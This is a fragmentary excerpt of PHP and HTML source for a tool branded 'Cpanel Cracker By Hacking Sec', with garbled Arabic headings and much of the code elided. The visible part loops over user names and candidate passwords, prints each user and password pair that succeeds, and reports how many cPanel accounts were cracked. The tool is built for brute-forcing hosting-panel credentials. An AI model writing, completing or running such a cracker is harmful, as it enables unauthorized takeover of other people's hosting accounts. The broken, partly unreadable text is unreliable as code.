...
<table style="width: 100%" class="style1" dir="rtl">
	<tr>
		<td class="style9"><strong>„ÊÃ… «·√Ê„—</strong></td>
	</tr>
	<tr>
		<td class="style13">
				<form method="post">
    ...
    foreach($a1 as $user )
    {
        ...
        $user=trim($user);
         for($i=0;$i<=$id2;$i++)
         {
            ...
            {
                echo "Hacking Sec~ user is (<b><font color=green>$user</font></b>) Password is (<b><font color=green>$pass</font></b>)<br />";
                $ok++;
            }
         }
        }
    }
    echo "<hr><b>You Found <font color=green>$ok</font> Cpanel (Hacking Sec)</b>";
...
<input name="page" type="hidden" value="find">        				
    ...
    <tr>
        <td valign="top" bgcolor="#151515"><center><strong><img src="http://www.medianama.com/wp-content/uploads/anonymous.jpg" /><br>
		</strong>
		<a href="http://www.hackingsec.in" class="style2"><strong>Cpanel Cracker By Hacking Sec</strong></a></center></td>
    </tr>
    <tr>
    <td>
